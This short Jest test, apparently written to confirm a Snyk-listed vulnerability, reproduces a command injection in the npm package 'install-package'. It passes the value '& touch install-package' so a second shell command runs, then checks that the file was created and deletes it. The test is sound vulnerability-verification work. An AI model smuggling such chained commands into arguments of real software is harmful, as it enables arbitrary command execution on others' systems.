//https://snyk.io/vuln/SNYK-JS-INSTALLPACKAGE-564267
test("Command Injection in install-package", () => 
{
	const root = require("install-package");
	const fs = require('fs');
	const path = './install-package';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	root("", "& touch install-package");
	
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});